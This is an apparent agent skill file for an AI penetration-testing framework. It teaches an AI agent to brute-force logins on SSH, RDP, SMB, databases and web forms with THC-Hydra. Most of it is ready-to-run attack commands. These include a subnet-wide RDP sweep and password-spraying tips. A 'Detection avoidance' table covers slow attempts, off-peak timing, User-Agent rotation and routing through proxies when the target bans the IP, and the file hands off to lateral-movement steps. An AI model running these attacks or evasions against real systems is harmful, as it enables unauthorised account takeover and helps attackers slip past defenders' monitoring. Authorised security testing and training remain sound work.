---
name: Hydra
description: Online password brute-forcing against SSH, HTTP, FTP, SMB, and dozens of other network services using THC-Hydra
---

# Hydra

Pull this skill when you need to brute-force authentication on a remote service — SSH, HTTP(S) forms/basic-auth, FTP, SMB, RDP, MySQL, PostgreSQL, SMTP, LDAP, or any of 50+ supported protocols.

## RedAmon wiring

| Action | Tool | Notes |
|--------|------|-------|
| Brute-force any service | `execute_hydra` | Primary interface |
| HTTP form brute-force | `execute_hydra` | Use `http-post-form` module |
| Service-specific credentials | `execute_hydra` | Multi-protocol support |
| PAS (Password-Authenticated) key exchange | `execute_hydra` | SSH key auth testing |
| Output to file | `execute_hydra` | `-o` flag for results |

## Primer

Hydra tries username/password combinations against a live service. Unlike hash cracking (offline), Hydra sends real network requests — so the target will see the attempts. Use responsibly and respect rate limits.

**When to use Hydra vs hashcat vs manual:**
| Tool | Best for |
|------|----------|
| Hydra | Live services with known protocols |
| Hashcat / John | Offline hash cracking |
| Medusa | Similar to Hydra, but single-threaded per host |
| Manual (curl) | Custom authentication flows Hydra doesn't support |

## Basic syntax

```bash
execute_hydra -l <username> -P <password_list> <protocol>://<target>
```

### Required arguments
| Argument | Example | Purpose |
|----------|---------|---------|
| `-l` or `-L` | `-l admin` or `-L users.txt` | Single username / username list |
| `-p` or `-P` | `-P rockyou.txt` | Single password / password list |
| `target` | `192.168.1.1` or `target.com` | Host to attack |
| `protocol` | `ssh`, `ftp`, `http-get`, `http-post-form`, `smb`, `rdp`, `mysql` | Service module |
| `-s` | `-s 2222` | Non-default port |

## Common protocols

### SSH
```bash
# Single user, password list
execute_hydra -l root -P rockyou.txt ssh://target.com

# User list, password list
execute_hydra -L users.txt -P rockyou.txt ssh://target.com

# Non-standard port
execute_hydra -l admin -P passwords.txt ssh://target.com -s 2222
```

### FTP
```bash
execute_hydra -L users.txt -P rockyou.txt ftp://192.168.1.100
```

### SMB
```bash
execute_hydra -L users.txt -P rockyou.txt smb://192.168.1.100
```

### RDP
```bash
# Be careful — RDP brute-force can lock accounts
execute_hydra -l administrator -P rockyou.txt rdp://192.168.1.100
```

### MySQL / PostgreSQL
```bash
execute_hydra -l root -P rockyou.txt mysql://192.168.1.100
execute_hydra -l postgres -P rockyou.txt postgres://192.168.1.100
```

### HTTP Basic Auth
```bash
execute_hydra -L users.txt -P rockyou.txt http-get://target.com/admin
```

### HTTP Form-based Auth (most common web apps)
```bash
# The format is: "path:body:fail_string"
# Body uses ^USER^ and ^PASS^ placeholders
execute_hydra -L users.txt -P rockyou.txt \
  target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

execute_hydra -L users.txt -P rockyou.txt \
  target.com http-post-form "/login:user=^USER^&pass=^PASS^&submit=Login:Login failed"
```

### HTTP POST with complex forms (includes CSRF/hidden fields)
```bash
# First, fetch the login page to extract CSRF token:
# curl -c cookies.txt target.com/login
# grep hidden field value for csrf_token

execute_hydra -L users.txt -P rockyou.txt \
  target.com http-post-form \
  "/login:csrf_token=VALUE&username=^USER^&password=^PASS^:Invalid"
```

## Advanced options

| Flag | Purpose |
|------|---------|
| `-t` | Threads (default 16, lower for rate-limited targets) |
| `-f` | Stop after first valid pair found |
| `-F` | Stop after first valid pair per host (multi-target) |
| `-v` | Verbose output (show each attempt) |
| `-V` | Very verbose (show login attempts on stdout) |
| `-o` | Output file for found credentials |
| `-I` | Ignore saved restores (start fresh) |
| `-w` | Timeout per attempt (default 30s) |
| `-W` | Connection timeout (default 30s) |
| `-e nsr` | Try blank password (n), login as password (s), reverse login (r) |
| `-M` | Multi-target mode — list of hosts |
| `-x` | Password generation: `-x 6:8:a` (min:max:charset) |
| `-C` | Colon-separated `user:pass` file (no -L/-P needed) |

## Recipes

### Quick SSH check on a subnet
```bash
execute_hydra -l root -P common_ssh_passwords.txt \
  -M hosts.txt ssh:// -t 4 -f \
  -o found_ssh.txt
```

### Web form with throttling
```bash
execute_hydra -L emails.txt -P passwords.txt \
  target.com http-post-form \
  "/login:email=^USER^&password=^PASS^:Invalid credentials" \
  -t 2 -f -I
```

### Multi-service sweep (via shell)
```bash
# Generate host list and hit multiple services
for ip in 192.168.1.{1..254}; do
  echo "ssh://$ip" >> targets_ssh.txt
  echo "rdp://$ip" >> targets_rdp.txt
done
execute_hydra -l administrator -P rockyou.txt -M targets_rdp.txt -t 3 -f
```

### Generate password permutations from known info
```bash
# If target is "Company2024", add common mutations:
# Company2024!, Company2025, company@2024, etc.
echo -e "Company2024\nCompany2024!\nCompany2025\nC0mpany2024\ncompany2024" > custom.txt
execute_hydra -l admin -P custom.txt ssh://target.com
```

## Pitfalls and recovery

| Pitfall | Fix |
|---------|-----|
| Account lockout | Lower threads (`-t 1`) and add delays between attempts |
| Too slow | Increase threads (`-t 64`) for non-rate-limited targets |
| HTTP form not working | Wrong fail string. Check the actual error message in browser. |
| "Module not available" | Hydra built without that module. Use `docker run vanhauser/hydra` for full build. |
| Connection timeout | Use `-w 5` and `-W 10` for fast networks; increase for slower targets |
| CAPTCHA blocking | Cannot brute through CAPTCHA. Look for API endpoints or alternative auth methods. |
| 2FA/MFA enabled | Hydra can't bypass 2FA. Target controls that issue session tokens before MFA. |
| Target bans IP | Rotate through proxies or add rate limiting |

## Detection avoidance

| Signal | Mitigation | Risk |
|--------|------------|------|
| Failed login events | `-t 1` with long delays | Minimal — looks like user error |
| Account lockout policies | Try top 5-10 passwords across many users | Low — few attempts per user |
| WAF/IPS detection | Use `-s` to try HTTPS; rotate User-Agent | Low |
| Massive log volume | Target off-peak hours (2-5 AM target time) | Medium |
| Source IP tracking | Route through proxies/VPN | See RoE |

## Hand-off

- After finding credentials: `-> /skill/tooling/impacket` for Windows lateral movement
- For SSH access: `-> /skill/network/pivoting_tunneling` for port forwarding
- For web admin panels: Check for file upload, RCE, or SQL injection
- For password cracking offline: `-> /skill/tooling/hashcat` if hashes can be dumped
- For AD password spraying: `-> /skill/active_directory/ad_kill_chain`

## Pro tips

- **Use `-f` to stop early**: Once you find one valid credential, there's usually no need to keep going. Save time with `-f`.
- **Crack smarter, not harder**: Try top 5 passwords (Season2024!, Password1, Welcome1, CompanyName1, Admin123) across all users before launching a full brute-force. You'd be surprised how often this works.
- **Form brute-force debugging**: Always test the fail string manually first with `curl` to confirm the exact error text. If the fail string doesn't match, Hydra reports everything as a success.
- **Combine with enum4linux**: AD usernames from `enum4linux` + `-L users.txt` is much more effective than guessing usernames.
- **Treat `-e nsr` as a warmup**: Before a full brute-force, run `execute_hydra -l admin -P /dev/null -e nsr` to try the easy variants (empty/null, same-as-username). It takes 3 seconds and catches ~5% of accounts.
